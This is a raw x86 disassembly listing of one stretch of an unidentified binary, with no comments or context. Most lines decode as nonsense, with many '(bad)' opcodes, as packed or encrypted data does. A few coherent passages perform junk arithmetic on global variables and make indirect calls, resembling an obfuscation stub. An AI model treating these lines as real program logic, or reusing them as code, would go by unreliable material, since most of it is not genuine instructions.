  4021cf:	or     DWORD PTR ds:0x4283d3,0xa53
  4021d9:	mov    eax,ds:0x428287
  4021de:	xor    DWORD PTR ds:0x42819b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbeee523a
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x7e7e7ee],bl
  40220e:	div    BYTE PTR [edi-0x8]
  402211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402212:	jmp    0x4021cd
  402214:	dec    ebp
  402215:	dec    ebp
  402216:	es scas al,BYTE PTR es:[edi]
  402218:	mov    edx,0xcd799c41
  40221d:	test   DWORD PTR [eax+0x1f],ecx
  402220:	or     ebx,0x2c868e98
  402226:	std    
  402227:	xor    eax,0xeb8acd3a
  40222c:	sub    DWORD PTR [ebx+0x18f28837],ebx
  402232:	int    0x44
  402234:	mov    esi,esp
  402236:	ss mov ch,0x36
  402239:	xchg   esi,eax
  40223a:	pop    eax
  40223b:	cmp    bh,ah
  40223d:	cli    
  40223e:	(bad)  
  40223f:	push   esi
  402240:	sub    edi,eax
  402242:	enter  0x8292,0xf5
  402246:	push   es
  402247:	mov    ecx,0x16d705e7
  40224c:	popa   
  40224d:	ret    0x5f04
  402250:	cmc    
  402251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402252:	mov    ch,BYTE PTR [edx+0x1c938e1]
  402258:	lds    esp,FWORD PTR [ecx+0x45]
  40225b:	aam    0xf6
  40225d:	xchg   ecx,eax
  40225e:	ds cs push edi
  402261:	inc    ebx
  402262:	add    al,0x3
  402264:	jne    0x40223b
  402266:	adc    DWORD PTR [ecx],edi
  402268:	fwait
  402269:	or     eax,0x25750bc5
  40226e:	(bad)  
  40226f:	xor    al,0x17
  402271:	loope  0x402266
  402273:	fdivr  QWORD PTR [ebp-0x49]
  402276:	and    BYTE PTR [edx],dh
  402278:	or     DWORD PTR [edx],0x2b84c0b1
  40227e:	test   al,0x7d
  402280:	push   ebx
  402281:	scas   al,BYTE PTR es:[edi]
  402282:	mov    ds:0x9013fe57,al
  402287:	inc    edi
  402288:	stos   DWORD PTR es:[edi],eax
  402289:	or     ebp,DWORD PTR [esi+ecx*4-0x30]
  40228d:	push   esp
  40228e:	xor    ch,BYTE PTR [esi-0x44]
  402291:	mov    bl,0x69
  402293:	fstp   QWORD PTR [esi+0x1f]
  402296:	push   0x66e50fa7
  40229b:	inc    esi
  40229c:	fistp  DWORD PTR [ebx]
  40229e:	cmp    DWORD PTR [edi],ecx
  4022a0:	scas   al,BYTE PTR es:[edi]
  4022a1:	leave  
  4022a2:	and    bh,ch
  4022a4:	add    bl,BYTE PTR [ecx]
  4022a6:	jbe    0x40225b
  4022a8:	jb     0x402231
  4022aa:	in     eax,0x7f
  4022ac:	push   edi
  4022ad:	dec    edx
  4022ae:	rcl    DWORD PTR [edx+eiz*2+0x1f6d4f7],0x56
  4022b6:	dec    ecx
  4022b7:	adc    al,0x4d
  4022b9:	and    esp,DWORD PTR [edi+0x30]
  4022bc:	ins    DWORD PTR es:[edi],dx
  4022bd:	cmc    
  4022be:	mov    ah,0xf2
  4022c0:	stc    
  4022c1:	sti    
  4022c2:	aas    
  4022c3:	rol    BYTE PTR [edx+ebp*2],1
  4022c6:	push   es
  4022c7:	jbe    0x4022ea
  4022c9:	xlat   BYTE PTR ds:[ebx]
  4022ca:	in     al,dx
  4022cb:	mov    esp,0x29c16bb4
  4022d0:	xlat   BYTE PTR ds:[ebx]
  4022d1:	call   0x88f9e070
  4022d6:	and    al,0x91
  4022d8:	sub    DWORD PTR [esi],ebx
  4022da:	(bad)  
  4022db:	ss add esp,esi
  4022de:	push   0x61
  4022e0:	out    dx,eax
  4022e1:	aaa    
  4022e2:	jno    0x4022cd
  4022e4:	dec    edx
  4022e5:	adc    dh,BYTE PTR [edi-0x7a]
  4022e8:	lods   eax,DWORD PTR ds:[esi]
  4022e9:	fst    DWORD PTR [ebp+0x51]
  4022ec:	ds mov dl,0x94
  4022ef:	ret    0x2c3e
  4022f2:	pop    esi
  4022f3:	loopne 0x4022ae
  4022f5:	mov    bl,0xb7
  4022f7:	cmp    DWORD PTR [ebx+0x47],esp
  4022fa:	sti    
  4022fb:	test   eax,0x4f873d25
  402300:	jge    0x40234b
  402302:	shl    BYTE PTR [edx+0x3e5e68fc],cl
  402308:	push   edx
  402309:	push   cs
  40230a:	cwde   
  40230b:	xchg   esi,eax
  40230c:	adc    eax,0xef87385
  402311:	cmp    cl,BYTE PTR [bx+si]
  402314:	stc    
  402315:	mov    esi,0x4186f517
  40231a:	je     0x4022d9
  40231c:	mov    ebp,DWORD PTR [eax+0x1d73c7fe]
  402322:	cmp    DWORD PTR [edi],eax
  402324:	add    DWORD PTR [eax],ebx
  402326:	loop   0x402392
  402328:	jmp    0xd6a4c7db
  40232d:	xchg   DWORD PTR [esi-0x6af0601b],edx
  402333:	pushf  
  402334:	retf   
  402335:	mul    DWORD PTR [ebx+esi*1+0x1e]
  402339:	or     BYTE PTR [esi+0x12],cl
  40233c:	jo     0x40238e
  40233e:	lods   al,BYTE PTR ds:[esi]
  40233f:	dec    ecx
  402340:	xor    eax,DWORD PTR [eax+0x591784f9]
  402346:	jle    0x402333
  402348:	data16 clc 
  40234a:	daa    
  40234b:	sub    al,BYTE PTR [edx-0x5826da38]
  402351:	leave  
  402352:	repz fsubr DWORD PTR [ecx]
  402355:	std    
  402356:	sub    BYTE PTR [ebp-0x31],dh
  402359:	in     al,dx
  40235a:	lahf   
  40235b:	imul   ebp,DWORD PTR [edi+0x34],0x2ba31446
  402362:	jb     0x4023b7
  402364:	jb     0x40234b
  402366:	(bad)  
  402368:	enter  0x2d4e,0xeb
  40236c:	sar    BYTE PTR [ebx+0xb31aa68],cl
  402372:	xlat   BYTE PTR ds:[ebx]
  402373:	ja     0x4022f5
  402375:	dec    esi
  402376:	aam    0x2e
  402378:	push   cs
  402379:	sbb    DWORD PTR [ecx+eiz*4-0x70],0xb11186fe
  402381:	js     0x40234b
  402383:	push   0xf4d583d0
  402388:	cmc    
  402389:	aad    0xfb
  40238b:	(bad)  
  40238c:	jo     0x40237a
  40238e:	inc    ebx
  40238f:	jmp    0x402317
  402391:	test   DWORD PTR [eax-0x4adc338b],eax
  402397:	dec    esp
  402398:	pusha  
  402399:	xchg   edx,eax
  40239a:	into   
  40239b:	pop    edx
  40239c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40239d:	aam    0xc7
  40239f:	dec    edi
  4023a0:	adc    DWORD PTR [edx],esp
  4023a2:	inc    ebx
  4023a3:	test   eax,0x11fa40b2
  4023a8:	stc    
  4023a9:	mov    ds:0x11f511c7,al
  4023ae:	mov    al,ds:0x965a98c8
  4023b3:	cmc    
  4023b4:	jmp    0x70c3e6cd
  4023b9:	pop    edx
  4023ba:	mul    BYTE PTR [edx-0x607066bb]
  4023c0:	pushf  
  4023c1:	and    DWORD PTR [ecx+0x4b228659],esp
  4023c7:	xlat   BYTE PTR ds:[ebx]
  4023c8:	out    0x8b,al
  4023ca:	xor    DWORD PTR [edi-0xf],ebx
  4023cd:	(bad)  
  4023ce:	xlat   BYTE PTR ds:[ebx]
  4023cf:	js     0x40238a
  4023d1:	pop    ss
  4023d2:	dec    eax
  4023d3:	adc    eax,0xe752b73
  4023d8:	inc    esp
  4023d9:	(bad)  
  4023da:	lea    ecx,ds:0x44e596fe
  4023e0:	or     dh,BYTE PTR [edi-0x65901f2a]
  4023e6:	dec    edx
  4023e7:	sub    DWORD PTR [edx],edx
  4023e9:	push   edi
  4023ea:	rcl    ebx,0x7c
  4023ed:	sbb    BYTE PTR [esi+0x693fa13f],0xfb
  4023f4:	or     al,BYTE PTR [ebx+0x43959093]
  4023fa:	pop    ebp
  4023fb:	jno    0x402410
  4023fd:	sub    al,0x93
  4023ff:	lea    edi,ds:0x538a655e
  402405:	mov    ebx,0x926b9d0
  40240a:	inc    esp
  40240b:	fisttp QWORD PTR [edi-0x677e1d4b]
  402411:	lods   eax,DWORD PTR ds:[esi]
  402412:	lahf   
  402413:	sub    edi,DWORD PTR [eax-0x4afd3006]
  402419:	dec    ecx
  40241a:	adc    al,0x1d
  40241c:	out    dx,al
  40241d:	or     al,0xe0
  40241f:	mov    ebx,0xdbc4b883
  402424:	jle    0x4023b3
  402426:	xor    eax,0xd5001374
  40242b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40242d:	add    BYTE PTR [edi],dh
  40242f:	in     al,dx
  402430:	adc    al,0xa6
  402432:	lock add edx,esi
  402435:	and    DWORD PTR [eax+0x7582533],0x1
  40243c:	mov    ah,0xde
  40243e:	mov    eax,ds:0xce29b8b6
  402443:	(bad)  
  402444:	clc    
  402445:	outs   dx,DWORD PTR ds:[esi]
  402446:	sbb    BYTE PTR [edi+0xfcfcf05],0x9b
  40244d:	cmp    BYTE PTR [esi],cl
  40244f:	ja     0x4023e2
  402451:	mov    DWORD PTR [eax+ebx*2],ebx
  402454:	(bad)  [edi]
  402456:	das    
  402457:	js     0x4023f1
  402459:	in     al,0xa6
  40245b:	jecxz  0x40242e
  40245d:	or     eax,0x4f95959e
  402462:	and    bh,ch
  402464:	jl     0x402485
  402466:	jmp    0x40243d
  402468:	push   ecx
  402469:	aas    
  40246a:	xchg   BYTE PTR [esi],al
  40246c:	fmul   DWORD PTR [esi]
  40246e:	mov    ah,0x77
  402470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402471:	xor    esp,DWORD PTR [ebx]
  402473:	les    edi,FWORD PTR [eax-0x5b]
  402476:	add    eax,0xb71b4cb9
  40247b:	xchg   DWORD PTR [ebp+0x7e707a34],esp
  402481:	ret    0x1dc1
  402484:	add    esi,esp
  402486:	fisttp DWORD PTR [edx]
  402488:	mov    esp,0x32b7f142
  40248d:	pop    ds
  40248e:	mov    bl,0x55
  402490:	xchg   esi,eax
  402491:	xor    BYTE PTR [eax],bh
  402493:	sbb    ah,BYTE PTR ds:0x202126b4
  402499:	fnstcw WORD PTR es:[edi+eax*1+0x44]
  40249e:	imul   ebx,DWORD PTR [ebp-0x12f2aeb9],0xffffffbc
  4024a5:	mov    ebx,DWORD PTR [ebp+0x1d]
  4024a8:	aad    0x58
  4024aa:	xor    al,0x7
  4024ac:	enter  0xa66e,0xc3
  4024b0:	or     al,0xfe
  4024b2:	aam    0xab
  4024b4:	add    esi,DWORD PTR [ecx-0x46025865]
  4024ba:	push   ebp
  4024bb:	jno    0x402504
  4024bd:	push   ss
  4024be:	inc    ecx
  4024bf:	into   
  4024c0:	cmp    BYTE PTR [edi+0x0],0x7
  4024c4:	inc    edi
  4024c5:	pusha  
  4024c6:	inc    esi
  4024c7:	(bad)  
  4024c8:	pop    edx
  4024c9:	mov    bl,0x4b
  4024cb:	xor    edi,0x68d8d4c7
  4024d1:	addr16 call 0x5055:0x311e9ee
  4024d9:	dec    eax
  4024da:	pop    ebp
  4024db:	scas   al,BYTE PTR es:[edi]
  4024dc:	ins    DWORD PTR es:[edi],dx
  4024dd:	retf   0xece3
  4024e0:	bound  ebx,QWORD PTR [ebp+0x41825ca2]
  4024e6:	lods   eax,DWORD PTR ds:[esi]
  4024e7:	xor    BYTE PTR [eax-0x46],dl
  4024ea:	inc    esp
  4024eb:	leave  
  4024ec:	jp     0x402569
  4024ee:	loop   0x4024ac
  4024f0:	xchg   esp,eax
  4024f1:	ds jne 0x40253a
  4024f4:	cdq    
  4024f5:	in     eax,dx
  4024f6:	mov    esp,DWORD PTR [ebx]
  4024f8:	scas   al,BYTE PTR es:[edi]
  4024f9:	inc    esp
  4024fa:	add    eax,0xe15745ed
  4024ff:	push   eax
  402500:	push   cs
  402501:	mov    eax,0x21dc8b1a
  402506:	in     al,dx
  402507:	or     ch,BYTE PTR [ecx-0x539955df]
  40250d:	dec    edi
  40250e:	sbb    al,bl
  402510:	pop    edx
  402511:	lea    edx,[esi+0x1a]
  402514:	repz lds eax,FWORD PTR gs:[ebx+0x70f634cc]
  40251c:	in     eax,0xfa
  40251e:	xor    esp,eax
  402520:	fcmovu st,st(7)
  402522:	les    ebx,FWORD PTR [ecx+0x72]
  402525:	inc    eax
  402526:	dec    ebx
  402527:	es daa 
  402529:	arpl   di,sp
  40252b:	push   ebp
  40252c:	cli    
  40252d:	sub    al,BYTE PTR [ebp-0x793fd9fe]
  402533:	add    eax,0x81e0a1d8
  402538:	rcl    DWORD PTR [eax-0x7a04626],cl
  40253e:	dec    ecx
  40253f:	jge    0x4024d4
  402541:	mov    edi,0x33768dfe
  402546:	fild   QWORD PTR [esi]
  402548:	rcl    BYTE PTR [eax],cl
  40254a:	inc    edi
  40254b:	add    BYTE PTR [eax+edx*1+0x22],dl
  40254f:	mov    cl,BYTE PTR [esi+ecx*2+0x2d]
  402553:	fcom   QWORD PTR [eax-0x72]
  402556:	push   ss
  402557:	xchg   cl,dl
  402559:	adc    eax,0xb9518df6
  40255e:	cmp    eax,0xc4cf2e5d
  402563:	fdivr  DWORD PTR [ebx]
  402565:	in     al,0xef
  402567:	mov    edx,DWORD PTR [edx]
  402569:	cld    
  40256a:	ins    DWORD PTR es:[edi],dx
  40256b:	(bad)  
  40256c:	pop    esi
  40256d:	mov    ebp,0x51ca509b
  402572:	and    esp,ebp
  402574:	jne    0x40255d
  402576:	test   al,0x91
  402578:	mov    eax,ds:0x1528132f
  40257d:	vcmpps ymm5,ymm6,YMMWORD PTR [edi],0x81
  402582:	inc    eax
  402583:	pop    ecx
  402584:	ins    DWORD PTR es:[edi],dx
  402585:	mov    al,0x81
  402587:	mov    ah,0x2
  402589:	sahf   
  40258a:	xor    al,BYTE PTR [esi-0x36c3d989]
  402590:	mov    dh,0x5f
  402592:	in     al,0xdb
  402594:	jb     0x40254e
  402596:	cwde   
  402597:	addr16 inc ebp
  402599:	fadd   st(0),st
  40259b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40259c:	xchg   ebp,eax
  40259d:	and    cl,ah
  40259f:	aaa    
  4025a0:	sub    esp,ecx
  4025a2:	(bad)  
  4025a3:	int3   
  4025a4:	add    eax,0x34929c8b
  4025a9:	dec    edx
  4025aa:	fisubr WORD PTR [edi+0x43]
  4025ad:	sub    al,0xbe
  4025af:	mov    bh,ch
  4025b1:	ret    0xd248
  4025b4:	mov    ah,0xc5
  4025b6:	and    DWORD PTR [esp+eiz*4-0x1c],edi
  4025ba:	mov    dl,0xe4
  4025bc:	cmp    BYTE PTR [ecx+0x4f],al
  4025bf:	pop    edi
  4025c0:	(bad)  
  4025c1:	push   ds
  4025c2:	in     eax,0x67
  4025c4:	push   edx
  4025c5:	dec    ebp
  4025c6:	or     eax,0x4a114236
  4025cb:	out    0xae,al
  4025cd:	mov    ebx,0x729045c7
  4025d2:	cmp    eax,DWORD PTR [eax]
  4025d4:	add    BYTE PTR [edi],cl
  4025d6:	mov    bh,0x5
  4025d8:	aas    
  4025d9:	add    DWORD PTR [edx+0x0],0x11
  4025dd:	add    eax,0x4281cb
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x4281b3,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x4281a7,0x0
  4025fd:	mov    DWORD PTR ds:0x428353,0x76b5
  402607:	mov    DWORD PTR ds:0x4281af,edx
  40260d:	mov    DWORD PTR ds:0x4282c7,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x4282b3
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x4281a7,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42827f
  402645:	call   DWORD PTR ds:0x428ddc
  40264b:	sbb    DWORD PTR ds:0x4283cb,0x36f
  402655:	adc    DWORD PTR ds:0x42834f,0x4281d7
  40265f:	sub    DWORD PTR ds:0x4283bf,0x42835b
  402669:	and    DWORD PTR ds:0x42819f,0x42828b
  402673:	add    DWORD PTR ds:0x42835f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x4281a7
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42819b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x4282cf,0x0
  4026b7:	mov    DWORD PTR ds:0x42832f,edx
  4026bd:	mov    DWORD PTR ds:0x42828b,ecx
  4026c3:	mov    DWORD PTR ds:0x4281b3,edx
  4026c9:	mov    DWORD PTR ds:0x4282af,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42819b
  4026dd:	mov    DWORD PTR ds:0x4282cf,edx
  4026e3:	cmp    DWORD PTR ds:0x4282cf,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428de0
  402708:	add    DWORD PTR ds:0x4282d7,0x428337
  402712:	sub    DWORD PTR ds:0x428353,0x6e4a
  40271c:	xor    DWORD PTR ds:0x4281ab,0x16a6
  402726:	dec    DWORD PTR ds:0x4281c7
  40272c:	and    DWORD PTR ds:0x4282ab,edx
  402732:	or     DWORD PTR ds:0x42833b,edx
  402738:	mov    eax,ds:0x4281cf
  40273d:	and    DWORD PTR ds:0x4283e3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283e3
  402751:	sbb    DWORD PTR ds:0x4282af,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42828f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428343
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x673a1eaa
  4027a0:	mov    esp,0x1818fc30
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [ecx-0x29],ch
  4027ab:	push   edi
  4027ac:	fist   WORD PTR [eax]
  4027ae:	lea    edi,[edi+0x5a140fce]
  4027b4:	jns    0x4027d6
  4027b6:	mov    ds:0xf611ba68,al
  4027bb:	sub    dh,BYTE PTR [ecx]
  4027bd:	dec    esi
  4027be:	or     dl,BYTE PTR [ebx-0x6b]
  4027c1:	mov    dl,0x6a
  4027c3:	mov    ah,0x27
  4027c5:	imul   edx,DWORD PTR ds:0xa673800f,0xc33e7d39
  4027cf:	or     eax,DWORD PTR [ecx-0x5e7ca79c]
  4027d5:	dec    ebx
  4027d6:	pushw  cs
  4027d8:	cwde   
  4027d9:	pusha  
  4027da:	pop    ecx
  4027db:	ror    BYTE PTR [ebp+0x2702b8cf],1
  4027e1:	jmp    0xb06f:0x202f3ffc
  4027e8:	stos   BYTE PTR es:[edi],al
  4027e9:	pop    ss
  4027ea:	mov    eax,ds:0x2a2a3778
  4027ef:	(bad)  
  4027f0:	(bad)  
  4027f2:	loope  0x402859
  4027f4:	or     BYTE PTR ds:0x12cac93c,bh
  4027fa:	mov    ecx,0x42b255ac
  4027ff:	dec    edx
  402800:	clc    
  402801:	jne    0x402837
  402803:	and    al,BYTE PTR [ebx+0x8a0bdd9]
  402809:	dec    ebp
  40280a:	scas   eax,DWORD PTR es:[edi]
  40280b:	mov    ecx,0x77fad2dc
  402810:	nop
  402811:	add    al,0x3b
  402813:	and    BYTE PTR [ebp-0x6a],cl
  402816:	pop    ss
  402817:	lea    esi,[ebx]
  402819:	neg    BYTE PTR [ebp+0x48]
  40281c:	sbb    BYTE PTR [edx],al
  40281e:	in     eax,0xb5
  402820:	int    0x49
  402822:	mov    DWORD PTR [edx+0x41],ebp
  402825:	inc    edi
  402826:	xchg   ebp,eax
  402827:	popa   
  402828:	mov    al,ch
  40282a:	sub    ebp,DWORD PTR fs:[esi+0x2c]
  40282e:	outs   dx,DWORD PTR ds:[esi]
  40282f:	gs pusha 
  402831:	dec    esi
  402832:	rol    DWORD PTR [esi-0x79],0xb4
  402836:	pop    ebp
  402837:	cld    
  402838:	mov    ds:0x7c6695d4,eax
  40283d:	repnz in eax,dx
  40283f:	popa   
  402840:	jns    0x4027e6
  402842:	in     al,0x1c
  402844:	jge    0x4027fa
  402846:	mov    ch,0x2b
  402848:	(bad)  [ebp+0x40e02ac1]
  40284e:	sar    BYTE PTR [ebp-0x75],0xf
  402852:	(bad)  
  402853:	jecxz  0x402869
  402855:	xchg   edx,eax
  402856:	dec    ebx
  402857:	mov    al,ds:0x914228b
  40285c:	or     ebx,DWORD PTR [ecx-0x57a808ab]
  402862:	add    BYTE PTR [esi+0x34],bl
  402865:	ins    DWORD PTR es:[edi],dx
  402866:	cmp    BYTE PTR [edx+0x5aa1b48a],ch
  40286c:	sub    DWORD PTR [eax],ebp
  40286e:	ja     0x4028cb
  402870:	jmp    0x611b41
  402875:	jge    0x402869
  402877:	cdq    
  402878:	push   ebp
  402879:	pop    ds
  40287a:	xchg   edi,eax
  40287b:	adc    dh,BYTE PTR [ebx-0x48667c]
  402881:	aaa    
  402882:	xor    al,0x29
  402884:	int3   
  402885:	hlt    
  402886:	ret    0xacfd
  402889:	leave  
  40288a:	call   0xfbbd:0xeea84313
  402891:	bnd jbe 0x402825
  402894:	out    0x1a,al
  402896:	pop    edi
  402897:	add    BYTE PTR [edx+0x73475ad7],dh
  40289d:	jmp    0x4e23:0xdefef88e
  4028a4:	xchg   esp,eax
  4028a5:	lock inc ecx
  4028a7:	ins    BYTE PTR es:[edi],dx
  4028a8:	shl    DWORD PTR [edx+0x55],0x12
  4028ac:	std    
  4028ad:	gs sub edx,edi
  4028b0:	or     edi,DWORD PTR [ecx-0x40]
  4028b3:	das    
  4028b4:	mov    ah,0x28
  4028b6:	sbb    ecx,edi
  4028b8:	shr    ebx,0xd5
  4028bb:	and    BYTE PTR [ecx-0x6fdf2229],ch
  4028c1:	or     BYTE PTR [ecx],dh
  4028c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028c4:	push   es
  4028c5:	jae    0x402849
  4028c7:	inc    ecx
  4028c8:	dec    eax
  4028c9:	add    eax,0x7707d01f
  4028ce:	mov    al,0x1e
  4028d0:	cmp    edi,ebp
  4028d2:	mov    ebp,DWORD PTR [ebx]
  4028d4:	sub    esp,eax
  4028d6:	(bad)  
  4028d7:	cmp    dh,BYTE PTR [edi-0xbf20910]
  4028dd:	repnz scas eax,DWORD PTR es:[edi]
  4028df:	xor    DWORD PTR [edi-0x2bab546],esp
  4028e5:	xchg   ecx,eax
  4028e6:	in     eax,dx
  4028e7:	fisttp DWORD PTR [edi+0x2999e779]
  4028ed:	push   cs
  4028ee:	push   es
  4028ef:	aad    0x11
  4028f1:	lds    eax,FWORD PTR [edi+edx*2+0x15]
  4028f5:	adc    ebx,ebx
  4028f7:	pop    edi
  4028f8:	mov    esp,0xd2963df5
  4028fd:	repnz adc esp,DWORD PTR [esi+0x133162a9]
  402904:	(bad)  
  402905:	repz pusha 
  402907:	add    al,0x6e
  402909:	pusha  
  40290a:	push   edx
  40290b:	sqrtps xmm2,XMMWORD PTR [ecx+eax*1-0x7b]
  402910:	(bad)  
  402912:	addr16 jb 0x402990
  402915:	or     esp,ebp
  402917:	or     ecx,DWORD PTR [ecx+0x7a82e61f]
  40291d:	add    BYTE PTR [esi-0x41],dh
  402920:	adc    ecx,esp
  402922:	ins    DWORD PTR es:[edi],dx
  402923:	out    0x60,al
  402925:	xor    dh,BYTE PTR [ebx+0x593f9c3]
  40292b:	and    al,cl
  40292d:	sub    eax,ebx
  40292f:	pusha  
  402930:	dec    ebp
  402931:	call   0x3e97:0xa9ec2c5c
  402938:	jp     0x402996
  40293a:	add    eax,0x38d1bea
  40293f:	(bad)  
  402940:	xor    BYTE PTR [ecx],ch
  402942:	adc    DWORD PTR [ebp+0x7daf7933],ebx
  402948:	xchg   edx,eax
  402949:	push   ebx
  40294a:	es in  al,dx
  40294c:	call   0xda7:0xcaf40bd1
  402953:	pop    edx
  402954:	into   
  402955:	sbb    al,0xd4
  402957:	cli    
  402958:	inc    esp
  402959:	in     al,dx
  40295a:	test   BYTE PTR [ecx],al
  40295c:	retf   0xaacc
  40295f:	xchg   edx,eax
  402960:	adc    esi,DWORD PTR [edi-0x7f096049]
  402966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402967:	mov    bl,0x5
  402969:	mov    WORD PTR ds:0x80fc6381,gs
  40296f:	es xchg ebp,eax
  402971:	mov    edx,0x44465f95
  402976:	and    ecx,DWORD PTR [ecx+0xc]
  402979:	clc    
  40297a:	rcr    dh,cl
  40297c:	dec    eax
  40297d:	xchg   DWORD PTR [ecx+0x71],eax
  402980:	mov    cl,0x2c
  402982:	out    0xe0,al
  402984:	add    cl,BYTE PTR [ecx-0x2cf9e5d9]
  40298a:	xchg   edi,eax
  40298b:	xor    bl,al
  40298d:	or     al,0xd2
  40298f:	fwait
  402990:	fwait
  402991:	adc    eax,0x1fff6977
  402996:	xlat   BYTE PTR ds:[ebx]
  402997:	push   ebp
  402998:	clc    
  402999:	rcl    BYTE PTR [edi+edx*8],1
  40299c:	push   es
  40299d:	push   eax
  40299e:	sub    edx,DWORD PTR [edx-0x13]
  4029a1:	jno    0x4029ca
  4029a3:	(bad)  
  4029a4:	bndldx (bad),[ecx+0x5e64fe13]
  4029ab:	add    ecx,ebx
  4029ad:	cmp    DWORD PTR [ebx+edi*1-0x16],esi
  4029b1:	fld    st(4)
  4029b3:	scas   eax,DWORD PTR es:[edi]
  4029b4:	jl     0x4029dc
  4029b6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4029b8:	mov    cl,0x2f
  4029ba:	xor    eax,0x711a099
  4029bf:	jg     0x4029ce
  4029c1:	xor    BYTE PTR [eax-0x1a],ah
  4029c4:	push   eax
  4029c5:	lods   eax,DWORD PTR ds:[esi]
  4029c6:	addr16 mov esp,0x65a9a2dc
  4029cc:	pop    eax
  4029cd:	adc    eax,0xc89d4049
  4029d2:	(bad)
  4029d5:	not    dl
  4029d7:	(bad)  
  4029d8:	cmp    eax,0x69c928a2
  4029dd:	add    eax,0x5526d0ff
  4029e2:	push   es
  4029e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e4:	dec    ebp
  4029e5:	mov    ebx,0x72dc1ba2
  4029ea:	fild   QWORD PTR [eax-0x66]
  4029ed:	xchg   edx,eax
  4029ee:	inc    ecx
  4029ef:	fbld   TBYTE PTR [ebx+0x47]
  4029f2:	aad    0x36
  4029f4:	cmp    BYTE PTR [eax+eax*8-0x4c121df5],0x61
  4029fc:	arpl   WORD PTR [edx+esi*2-0x1e0503db],si
  402a03:	adc    eax,0x3a0c57d4
  402a08:	jne    0x402a25
  402a0a:	div    BYTE PTR ds:0x96f0dcb7
  402a10:	pop    eax
  402a11:	repz arpl WORD PTR [ebp-0x80],cx
  402a15:	cdq    
  402a16:	inc    edx
  402a17:	repnz jecxz 0x402a2a
  402a1a:	add    eax,0xc1e4f708
  402a1f:	jbe    0x402a44
  402a21:	mov    eax,0x6cbbf2e4
  402a26:	dec    ecx
  402a27:	and    BYTE PTR [ecx],bl
  402a29:	mov    ecx,0xd9912ec5
  402a2e:	mov    esi,ebp
  402a30:	(bad)  
  402a31:	push   esi
  402a32:	sti    
  402a33:	inc    ecx
  402a34:	add    DWORD PTR [edi],edi
  402a36:	(bad)  
  402a37:	jbe    0x402ab4
  402a39:	pop    ss
  402a3a:	in     eax,dx
  402a3b:	rol    BYTE PTR [eax],cl
  402a3d:	mov    ch,0x90
  402a3f:	mov    DWORD PTR [edx],esp
  402a41:	mov    ecx,ecx
  402a43:	mov    edx,0xa8ebdfb6
  402a48:	xchg   esp,eax
  402a49:	ja     0x402a76
  402a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4c:	push   esp
  402a4d:	mov    ebx,DWORD PTR [edi+esi*4-0x66]
  402a51:	xor    eax,0xe4217f6d
  402a56:	(bad)  
  402a57:	sbb    DWORD PTR [ebp+0x12],ecx
  402a5a:	jecxz  0x402a13
  402a5c:	cld    
  402a5d:	push   esi
  402a5e:	and    BYTE PTR [esi-0x7c],0x6
  402a62:	retf   0x2f78
  402a65:	jae    0x402a08
  402a67:	cmp    BYTE PTR [edx-0x75],al
  402a6a:	xor    edi,DWORD PTR [esi]
  402a6c:	shl    BYTE PTR [esi],0x8f
  402a6f:	sub    esi,DWORD PTR ds:0x4abb262a
  402a75:	ret    0xfb45
  402a78:	mov    ds:0x7702cc1a,eax
  402a7d:	dec    edx
  402a7e:	pusha  
  402a7f:	js     0x402a8f
